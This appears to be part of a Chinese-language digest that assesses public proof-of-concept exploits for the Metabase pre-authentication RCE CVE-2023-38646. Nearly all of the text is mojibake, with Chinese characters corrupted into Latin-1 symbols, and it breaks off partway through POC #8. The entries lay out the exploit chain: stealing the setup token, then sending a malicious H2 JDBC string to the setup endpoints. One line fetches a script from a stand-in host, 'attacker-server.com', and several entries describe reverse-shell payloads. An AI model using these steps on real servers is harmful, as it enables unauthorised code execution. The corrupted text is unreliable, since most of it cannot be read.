**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ä»¥é€šè¿‡HTTPè®¿é—®ï¼Œä¸”æœªè¿›è¡Œèº«ä»½éªŒè¯é…ç½®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæœç´¢ç»“æœï¼Œè¯¥æ¼æ´åˆ©ç”¨äº† Metabase å¤„ç†æ•°æ®åº“è¿æ¥çš„æ–¹å¼ï¼Œç‰¹åˆ«æ˜¯ H2 æ•°æ®åº“ã€‚æä¾›çš„ POC è„šæœ¬é¦–å…ˆè·å– setup tokenï¼Œç„¶ååˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜è´¦æˆ·ï¼Œæœ€åæ·»åŠ ä¸€ä¸ªæ¶æ„çš„æ•°æ®åº“è¿æ¥ï¼Œè¯¥è¿æ¥åŒ…å«ä¸€ä¸ª H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œå…¶ä¸­åŒ…å«åµŒå…¥å¼å‘½ä»¤ï¼Œå…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ã€‚è¿æ¥å­—ç¬¦ä¸²ä¸­çš„ `INIT=RUNSCRIPT FROM 'http://attacker-server.com/poc.sql'` æŒ‡ç¤º H2 ä»è¿œç¨‹æœåŠ¡å™¨æ‰§è¡Œ SQL è„šæœ¬ï¼Œè™½ç„¶ `poc.sql` æ–‡ä»¶æœ¬èº«æ— å®³ï¼Œä½†çœŸæ­£çš„æ”»å‡»è½½è·åµŒå…¥åœ¨è¿æ¥å­—ç¬¦ä¸²æœ¬èº«ï¼Œåˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºä¸€ä¸ªJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**åˆ©ç”¨æ–¹å¼ï¼š**\n1. **è·å– Setup Token:**  é€šè¿‡è®¿é—® `/api/session/properties` è·å–åˆå§‹è®¾ç½®æ‰€éœ€çš„ tokenã€‚\n2. **è®¾ç½®ç®¡ç†å‘˜è´¦æˆ·:**  ä½¿ç”¨è·å–çš„ tokenï¼Œè°ƒç”¨ `/api/setup` åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜è´¦æˆ·ã€‚è¿™å°†åˆ›å»ºä¸€ä¸ªå…·æœ‰å¿…è¦æƒé™çš„ä¼šè¯ã€‚\n3. **æ·»åŠ æ¶æ„æ•°æ®åº“è¿æ¥:** ä½¿ç”¨æ–°åˆ›å»ºçš„ç®¡ç†å‘˜ä¼šè¯ï¼Œè°ƒç”¨ `/api/database` API æ·»åŠ ä¸€ä¸ªæ–°çš„æ•°æ®åº“ã€‚å…³é”®åœ¨äºæ„é€ æ¶æ„çš„ H2 è¿æ¥å­—ç¬¦ä¸²ï¼Œåˆ©ç”¨ `INIT` å‚æ•°æ‰§è¡Œè¿œç¨‹ SQL è„šæœ¬ï¼Œè¯¥è„šæœ¬å®šä¹‰äº†ä¸€ä¸ª Java å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚ä¸ºäº†ç»•è¿‡æŸäº›é™åˆ¶ï¼Œé€šå¸¸åˆ©ç”¨ `CREATE ALIAS` åˆ›å»ºJavaå‡½æ•°,ä»è€Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚\n\n**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ PoC ä»£ç æ˜¯æœ‰æ•ˆçš„ï¼Œå®ƒèƒ½å¤Ÿåˆ©ç”¨è¯¥æ¼æ´åœ¨ Metabase å®ä¾‹ä¸Šæ‰§è¡Œä»»æ„ä»£ç ï¼Œå¦‚æœç›®æ ‡å®ä¾‹çš„ç‰ˆæœ¬ä½äºå—å½±å“çš„ç‰ˆæœ¬ã€‚\n\n**æŠ•æ¯’é£é™©ï¼š** é£é™©ä¸º10%ï¼Œä¸»è¦é£é™©åœ¨äº `exploit.py` æ–‡ä»¶ä¸­`YOUR_GITPOD_WORKSPACE_URL` å¦‚æœä¸æ˜¯æ”»å‡»è€…è‡ªå·±çš„æœåŠ¡å™¨ï¼Œå­˜åœ¨è¢«ä¸­é—´äººæ”»å‡»æ›¿æ¢è¿æ¥çš„é£é™©. è™½ç„¶`poc.sql`ç›®å‰ä»…ä»…æ˜¯ `SELECT 1;`ï¼Œ ä½†æ˜¯å¦‚æœæœ‰äººæ¶æ„ä¿®æ”¹`poc.sql`ï¼Œåˆ™å­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚ start.shä¸­çš„metabase.jaræ¥æºå¯èƒ½è¢«ç¯¡æ”¹ï¼Œå­˜åœ¨è¢«æŠ•æ¯’é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [BreezeGalaxy/CVE-2023-38646](https://github.com/BreezeGalaxy/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #5

**æ¥æº**: [CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md](../2023/CVE-2023-38646-CN016_Metabase-H2-CVE-2023-38646-.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç 

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡éœ€è¦å¯è®¿é—®ï¼Œæ— éœ€è®¤è¯

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´å­˜åœ¨äºMetabaseçš„setupæµç¨‹ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨H2æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„JDBC URLæ¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§:**
æä¾›çš„POCä»£ç çœ‹èµ·æ¥æœ‰æ•ˆã€‚å®ƒåŒ…å«ä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š
1.  è·å–setup-tokenï¼šPOCé¦–å…ˆå°è¯•ä»`/api/session/properties`è·å–setup-tokenã€‚è¿™æ˜¯åˆ©ç”¨æ¼æ´çš„å‰æã€‚ä»æ¼æ´ä¿¡æ¯æ¥çœ‹ï¼Œè¿™ä¸ªæ¥å£ä¸éœ€è¦èº«ä»½éªŒè¯ã€‚
2.  æ„é€ Payloadï¼šPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚è¯¥URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å‘½ä»¤çš„æ‰§è¡Œæ˜¯é€šè¿‡è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`å®ç°çš„ã€‚POCä¸­é»˜è®¤æ‰§è¡Œ`touch /tmp/success`ï¼Œè¿™æ˜¯ä¸€ä¸ªæ— å®³çš„å‘½ä»¤ï¼Œç”¨äºéªŒè¯æ¼æ´çš„å­˜åœ¨ã€‚
3.  å‘é€Payloadï¼šPOCå°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚å¦‚æœæœåŠ¡å™¨è¿”å›åŒ…å«"Error creating or initializing trigger"çš„å“åº”ï¼Œåˆ™è¡¨æ˜æ¼æ´åˆ©ç”¨æˆåŠŸã€‚

**æŠ•æ¯’é£é™©:**
è™½ç„¶POCçš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€äº›æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚ä»¥ä¸‹æ˜¯åˆ†æï¼š
1. **`custom_base64_encode`å‡½æ•°:** è¿™ä¸ªå‡½æ•°å­˜åœ¨è¢«æ»¥ç”¨çš„å¯èƒ½ã€‚è™½ç„¶å…¶ç›®çš„æ˜¯å¯¹å‘½ä»¤è¿›è¡Œç¼–ç ï¼Œä½†å¦‚æœç”¨äºç¼–ç æ¶æ„è„šæœ¬å¹¶æ‰§è¡Œï¼Œåˆ™ä¼šäº§ç”Ÿå®‰å…¨é—®é¢˜ã€‚
2. **å‘½ä»¤æ‰§è¡Œ:** POCä¸­ä½¿ç”¨`java.lang.Runtime.getRuntime().exec()`æ‰§è¡Œå‘½ä»¤ã€‚è¿™æœ¬èº«å°±å¾ˆå±é™©ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥æ‰§è¡Œä»»ä½•å‘½ä»¤ï¼ŒåŒ…æ‹¬ä¸‹è½½å’Œæ‰§è¡Œæ¶æ„è„šæœ¬ã€‚
3. **é»˜è®¤å‘½ä»¤:** è™½ç„¶POCé»˜è®¤æ‰§è¡Œçš„æ˜¯`touch /tmp/success`ï¼Œä½†æ”»å‡»è€…å¯ä»¥å¾ˆå®¹æ˜“åœ°ä¿®æ”¹`-c`å‚æ•°æ¥æ‰§è¡Œä»»ä½•å…¶ä»–å‘½ä»¤ã€‚å¦‚æœPOCè¢«åˆ†å‘å¹¶è¢«ç¼ºä¹ç»éªŒçš„ç”¨æˆ·ä½¿ç”¨ï¼Œä»–ä»¬å¯èƒ½ä¼šç›´æ¥æ‰§è¡Œæ”»å‡»è€…æä¾›çš„æ¶æ„å‘½ä»¤ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©ä¸»è¦åœ¨äºä½¿ç”¨è€…å¯èƒ½å—åˆ°æ¶æ„å‘½ä»¤çš„å½±å“ã€‚`custom_base64_encode`å‡½æ•°å’Œå‘½ä»¤æ‰§è¡Œæœºåˆ¶ä¹Ÿä¸ºæ½œåœ¨çš„æ¶æ„è¡Œä¸ºæä¾›äº†å¯èƒ½æ€§ã€‚é£é™©è¯„ä¼°ä¸º 10%ï¼Œä¸»è¦æ¥æºäºä½¿ç”¨è€…æ²¡æœ‰å®‰å…¨æ„è¯†ï¼Œç›´æ¥æ‰§è¡Œäº†æ¶æ„å‘½ä»¤ï¼Œæˆ–è€…ä»£ç åº“çš„ä¸‹è½½æºè¢«æ›¿æ¢ã€‚

**åˆ©ç”¨æ–¹å¼:**
1.  æ”»å‡»è€…é¦–å…ˆå‘`/api/session/properties`å‘é€GETè¯·æ±‚ä»¥è·å–setup-tokenã€‚
2.  ç„¶åï¼Œæ”»å‡»è€…æ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„JDBC URLçš„JSON payloadã€‚æ¶æ„JDBC URLåˆ©ç”¨H2æ•°æ®åº“çš„`CREATE TRIGGER`åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºä¸€ä¸ªåœ¨`INFORMATION_SCHEMA.TABLES`ä¸Šè§¦å‘çš„triggerï¼Œå¹¶åœ¨è§¦å‘æ—¶æ‰§è¡ŒJavaä»£ç ã€‚Javaä»£ç è°ƒç”¨`java.lang.Runtime.getRuntime().exec()`æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ã€‚
4.  å¦‚æœæœåŠ¡å™¨æˆåŠŸåˆ›å»ºäº†triggerï¼Œåˆ™æ”»å‡»æˆåŠŸï¼Œæ”»å‡»è€…æ‰§è¡Œçš„å‘½ä»¤å°†åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œã€‚

**é¡¹ç›®åœ°å€:** [CN016/Metabase-H2-CVE-2023-38646-](https://github.com/CN016/Metabase-H2-CVE-2023-38646-)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #6

**æ¥æº**: [CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md](../2023/CVE-2023-38646-DaniTheHack3r_CVE-2023-38646.md)

## CVE-2023-38646 Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯å³å¯æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹å¯ç½‘ç»œè®¿é—®ï¼Œä¸”ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´çš„ä¸¥é‡ç¨‹åº¦ä¸ºé«˜å±ï¼Œå› ä¸ºæ”»å‡»è€…å¯ä»¥å®Œå…¨æ§åˆ¶å—å½±å“çš„æœåŠ¡å™¨ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Token:** POCä»£ç é¦–å…ˆå°è¯•ä» `[TARGET_URL]/api/session/properties` è·å– setup-tokenã€‚
2.  **æ„é€  Payload:** åˆ©ç”¨è·å–åˆ°çš„tokenï¼ŒPOCæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ payloadã€‚è¯¥å­—ç¬¦ä¸²ä¸­åŒ…å«å¯æ‰§è¡Œå‘½ä»¤ï¼ˆé€šè¿‡ `COMMAND` å‚æ•°ä¼ å…¥ï¼‰ï¼Œé€šå¸¸é€šè¿‡ Base64 ç¼–ç è¿›è¡Œæ··æ·†ã€‚
3.  **å‘é€ Payload:** æ„é€ å¥½çš„payloadä¼šè¢«å‘é€åˆ° Metabase æœåŠ¡å™¨ï¼Œåˆ©ç”¨å…¶å¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²å¤„ç†ä¸å½“çš„æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
4.  **å‘½ä»¤æ‰§è¡Œ:**  é€šè¿‡åˆ›å»ºè§¦å‘å™¨å’Œåˆ©ç”¨H2æ•°æ®åº“ç‰¹æ€§ï¼Œå®ç°åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´æè¿°ã€æœç´¢å¼•æ“ç»“æœï¼ˆä¾‹å¦‚ï¼Œ[https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/](https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646/) ï¼‰å’ŒPOCä»£ç ï¼Œæ­¤æ¼æ´åˆ©ç”¨çš„æœ‰æ•ˆæ€§è¾ƒé«˜ã€‚å¤šä¸ªæ¥æºè¡¨æ˜ï¼Œè¯¥æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

**æŠ•æ¯’é£é™©è¯„ä¼°ï¼š**

POCä»£ç ä¸­å­˜åœ¨ä¸€å®šçš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œå‘½ä»¤ï¼Œä½†ä»£ç ä¸­å­˜åœ¨ä»¥ä¸‹æ½œåœ¨çš„é£é™©ç‚¹ï¼š

*   **è‡ªå®šä¹‰ Base64 ç¼–ç :**  `CustomBase64Encode` å‡½æ•°ä½¿ç”¨è‡ªå®šä¹‰çš„ Base64 ç¼–ç æ–¹å¼ï¼Œè™½ç„¶ç›®çš„æ˜¯ä¸ºäº†ç¬¦åˆæ¼æ´åˆ©ç”¨çš„è¦æ±‚ï¼Œä½†ä¹Ÿå¯èƒ½è¢«ç”¨æ¥éšè—æ¶æ„ä»£ç ã€‚
*   **Payload æ„é€ :** Payloadçš„æ„é€ è¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ”»å‡»è€…å¯èƒ½åœ¨payloadä¸­åµŒå…¥é¢å¤–çš„æ¶æ„ä»£ç ï¼Œä¾‹å¦‚ï¼Œåœ¨è¿æ¥å­—ç¬¦ä¸²ä¸­æ·»åŠ é¢å¤–çš„å‚æ•°ï¼Œä»¥ä¾¿åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œã€‚
*   **ä»£ç†è®¾ç½®:** æ¶æ„æ”»å‡»è€…å¯èƒ½ä¼šé€šè¿‡ä»£ç†æœåŠ¡å™¨å‘èµ·æ”»å‡», ä»è€Œéšè—è‡ªå·±çš„èº«ä»½ä¿¡æ¯.

å°½ç®¡å¦‚æ­¤ï¼Œæ ¹æ®ä»£ç æœ¬èº«ï¼Œå¤§éƒ¨åˆ†ä»£ç æ˜¯ç”¨äºå®ç°æ¼æ´åˆ©ç”¨åŠŸèƒ½çš„ï¼ŒæŠ•æ¯’çš„å¯èƒ½æ€§ç›¸å¯¹è¾ƒä½ï¼Œä¼°è®¡åœ¨10%å·¦å³ã€‚éœ€è¦äººå·¥å®¡æ ¸Payloadæ„é€ éƒ¨åˆ†ã€‚


**é¡¹ç›®åœ°å€:** [DaniTheHack3r/CVE-2023-38646](https://github.com/DaniTheHack3r/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #7

**æ¥æº**: [CVE-2023-38646-Ego1stoo_CVE-2023-38646.md](../2023/CVE-2023-38646-Ego1stoo_CVE-2023-38646.md)

## CVE-2023-38646 Metabase Pre-Auth RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source before 0.46.6.1 å’Œ Metabase Enterprise before 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡ Metabase å®ä¾‹éœ€è¦è¿è¡Œåœ¨å—å½±å“çš„ç‰ˆæœ¬èŒƒå›´å†…ï¼Œå¹¶ä¸”æ”»å‡»è€…èƒ½å¤Ÿé€šè¿‡ç½‘ç»œè®¿é—®åˆ°è¯¥å®ä¾‹ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´çš„åˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æ¼æ´åŸç†ï¼š** Metabase å­˜åœ¨ä¸€ä¸ªæœªæˆæƒçš„ `/api/setup/validate` æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåœ¨ Metabase é¦–æ¬¡è®¾ç½®æ—¶éªŒè¯æ•°æ®åº“è¿æ¥ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¥å£ï¼Œé€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚
2.  **åˆ©ç”¨æ­¥éª¤ï¼š**
    *   é¦–å…ˆï¼Œæ”»å‡»è€…è®¿é—® Metabase å®ä¾‹çš„æ ¹è·¯å¾„ï¼Œè·å– `setup-token`ã€‚è¿™ä¸ªtokenè¢«åµŒå…¥åœ¨HTMLå“åº”çš„JavaScriptä»£ç ä¸­ï¼Œç”¨äºåç»­çš„è®¾ç½®è¿‡ç¨‹ã€‚
    *   ç„¶åï¼Œæ”»å‡»è€…å‘ `/api/setup/validate` æ¥å£å‘é€ POST è¯·æ±‚ï¼Œè¯·æ±‚ä½“åŒ…å«ä¸€ä¸ªæ¶æ„çš„ JSON å¯¹è±¡ã€‚è¿™ä¸ª JSON å¯¹è±¡çš„ `details.details.db` å­—æ®µåŒ…å«ä¸€ä¸ªç‰¹åˆ¶çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¿™ä¸ªè¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥äº†æ¶æ„ä»£ç ï¼Œåˆ©ç”¨ H2 æ•°æ®åº“çš„ `TRACE_LEVEL_SYSTEM_OUT` å’Œ `CREATE TRIGGER` åŠŸèƒ½æ¥æ‰§è¡Œä»»æ„çš„ shell å‘½ä»¤ã€‚
    *   POCä»£ç æ„é€ äº†ä¸€ä¸ªåå¼¹shellçš„payloadï¼Œå°†ç›®æ ‡æœºå™¨ä¸Šçš„è¾“å…¥è¾“å‡ºé‡å®šå‘åˆ°æ”»å‡»è€…æ§åˆ¶çš„æœºå™¨ä¸Šï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
3.  **æŠ•æ¯’é£é™©åˆ†æï¼š**
    è™½ç„¶æä¾›çš„ä»£ç ä¸»è¦æ˜¯ç”¨äºæ¼æ´åˆ©ç”¨ï¼Œä½†ä»å­˜åœ¨è½»å¾®çš„æŠ•æ¯’é£é™©ã€‚é£é™©ç‚¹ä¸»è¦å­˜åœ¨äº`CVE-2023-38646.py`è„šæœ¬ä¸­çš„`payload`å˜é‡ã€‚å½“å‰çš„`payload`ç”¨äºåˆ›å»ºä¸€ä¸ªåå‘shellè¿æ¥ï¼Œè™½ç„¶æœ¬èº«ä¸æ˜¯æ¶æ„ä»£ç ï¼Œä½†å¯èƒ½è¢«ä¿®æ”¹ä¸ºæ‰§è¡Œæ›´å…·ç ´åæ€§çš„æ“ä½œã€‚å¦å¤–ï¼Œä½œè€…æä¾›çš„githubé“¾æ¥ä¸­çš„å›¾ç‰‡å¯èƒ½æ˜¯ç»è¿‡ä¿®æ”¹çš„ã€‚
    æ€»ä½“è€Œè¨€ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œä½†éœ€è¦ä»”ç»†å®¡æŸ¥ä»£ç ï¼Œç¡®ä¿å…¶æ²¡æœ‰è¢«ç¯¡æ”¹æˆ–æ·»åŠ æ¶æ„åŠŸèƒ½ã€‚


**é¡¹ç›®åœ°å€:** [Ego1stoo/CVE-2023-38646](https://github.com/Ego1stoo/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #8

**æ¥æº**: [CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md](../2023/CVE-2023-38646-JayRyz_CVE-2023-38646-PoC-Metabase.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ(RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** Metabase open source < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹è¿è¡Œåœ¨å—å½±å“ç‰ˆæœ¬ï¼Œä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨MetabaseæœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæ­¤æ¼æ´å½±å“Metabaseå¼€æºç‰ˆæœ¬ä½äº0.46.6.1å’ŒMetabaseä¼ä¸šç‰ˆæœ¬ä½äº1.46.6.1ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Tokenï¼š** åˆ©ç”¨ PoC ä»£ç ä¸­çš„ `get_token` å‡½æ•°ï¼Œé€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å– setup-tokenã€‚
2.  **æ„é€ æ¶æ„Payloadï¼š** åˆ©ç”¨è·å–çš„ setup-token, æ„é€ åŒ…å«æ¶æ„å‘½ä»¤çš„payloadã€‚PoC ä»£ç ä½¿ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ SQL è¯­å¥ï¼Œè¯¥è¯­å¥åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼ˆTRIGGERï¼‰ï¼Œåœ¨è§¦å‘å™¨ä¸­æ‰§è¡Œå‘½ä»¤ã€‚å‘½ä»¤ä½¿ç”¨äº†åå¼¹shellçš„æŠ€æœ¯ã€‚ é¦–å…ˆå°†è¦æ‰§è¡Œçš„shellå‘½ä»¤è¿›è¡Œbase64ç¼–ç , ç„¶ååˆ©ç”¨`java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œå‘½ä»¤ã€‚
3.  **å‘é€Exploitï¼š** é€šè¿‡ POST è¯·æ±‚å°†æ„é€ çš„ payload å‘é€åˆ° Metabase æœåŠ¡å™¨ã€‚
4.  **åå¼¹ Shellï¼š** æ”»å‡»è€…ä½¿ç”¨ `nc` ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœåŠ¡å™¨æ‰§è¡Œå‘½ä»¤ååå¼¹ shellã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æä¾›çš„æ¼æ´ä¿¡æ¯å’ŒPoCä»£ç ï¼Œæ­¤æ¼æ´çš„åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´åº“ä¿¡æ¯æ˜ç¡®æŒ‡å‡ºæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨æ­¤æ¼æ´æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æœç´¢å¼•æ“ç»“æœä¸­ä¹ŸåŒ…å«å¤§é‡å…³äºæ­¤æ¼æ´çš„åˆ†æå’Œåˆ©ç”¨æ–‡ç« ï¼Œè¿›ä¸€æ­¥éªŒè¯äº†å…¶æœ‰æ•ˆæ€§ã€‚PoCä»£ç æä¾›äº†è‡ªåŠ¨åŒ–åˆ©ç”¨çš„è„šæœ¬ã€‚

**æŠ•æ¯’é£é™©ï¼š**

æä¾›çš„ PoC ä»£ç ä¸­å­˜åœ¨æ½œåœ¨çš„æŠ•æ¯’é£é™©ã€‚è™½ç„¶ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†ä»£ç ä¸­å¯èƒ½åŒ…å«ä»¥ä¸‹æ½œåœ¨é£é™©ï¼š

